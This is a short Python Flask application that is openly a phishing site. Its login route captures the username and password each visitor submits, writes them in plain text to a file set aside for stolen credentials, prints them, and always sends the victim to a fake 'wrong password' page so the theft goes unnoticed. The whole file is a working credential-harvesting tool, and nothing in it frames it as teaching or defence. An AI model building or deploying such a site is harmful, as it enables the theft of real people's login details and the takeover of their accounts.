from flask import Flask, render_template, request, redirect, url_for
import os 
from my_configs import add_my_configs
add_my_configs() 

app = Flask(__name__)
filename = os.environ["phishing_site_credentials_path"]

@app.route('/')
def home():
	return render_template('home.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
	if request.method == 'POST':
		username = request.form['username']
		password = request.form['password']
		with open(filename, 'a') as file:
			file.write(username + ',' + password + '\n')
		
		print(f'Username: {username}, Password: {password}')
		#always route to wrong password
		return redirect(url_for('wrong_password'))  
	return render_template('login.html')

@app.route('/wrong_password')
def wrong_password():
    return render_template('wrong_password.html')


if __name__ == '__main__':
	app.run(debug=True)
